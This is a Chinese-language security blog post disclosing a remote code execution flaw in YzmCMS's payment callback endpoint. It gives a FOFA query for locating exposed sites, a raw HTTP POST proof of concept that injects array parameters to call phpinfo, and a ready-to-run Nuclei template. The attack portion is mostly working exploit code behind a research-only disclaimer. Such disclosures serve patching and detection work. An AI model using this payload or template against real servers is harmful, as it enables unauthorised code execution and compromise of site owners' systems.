#  YzmCMS pay_callback.html RCE漏洞   
lcyunkong  贫僧法号云空   2024-05-05 12:01  
  
**0x00 阅读须知**  
  
****  
**免责声明：****本文提供的信息和方法仅供网络安全专业人员用于教学和研究目的，不得用于任何非法活动。读者若使用文章内容从事任何未授权的行为，需自行承担所有法律责任和后果。本公众号及作者对由此引起的任何直接或间接损失不负责任。请严格遵守相关法律法规。**  
###   
### 0x01 漏洞简介  
  
  
YzmCMS是一款轻量级、高效且开源的内容管理系统，它基于PHP+Mysql架构。这个系统被发现存在RCE漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSYIeA1vkZqfVvF0FPoWibFjzMdxXox765DCwo4VHlnNp0iawAjODY9DicHClOhiboRHn6zRGLjDLQoCSQ/640?wx_fmt=png&from=appmsg "")  
### 0x02 漏洞详情  
  
****  
**fofa：****app="yzmcms"**  
  
****  
**Poc：**  
```
POST /pay/index/pay_callback.html HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded

out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSYIeA1vkZqfVvF0FPoWibFjznW5ODKeibjJQVIibj6sTGbz9BCUibibpxEnnk0VnwBwq1tTwI8XXHezV9Q/640?wx_fmt=png&from=appmsg "")  
  
**0x03 Nuclie**  
  
```
id: yzmcms-pay_callback-rce

info:
  name: yzmcms-pay_callback-rce
  author: yunkong
  severity: high
  description: YzmCMS pay_callback.html RCE漏洞
  tags: yzmcms,rce

http:
  - raw:
      - |-
        POST /pay/index/pay_callback.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
        Accept-Encoding: gzip
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 60

        out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - phpinfo()
      - type: status
        status:
          - 200
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSYIeA1vkZqfVvF0FPoWibFjzPCIJdt8VlmswBccRGiaBubdOibibx5w5d6bChgtHsjROE2QZsHE8hQUibQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
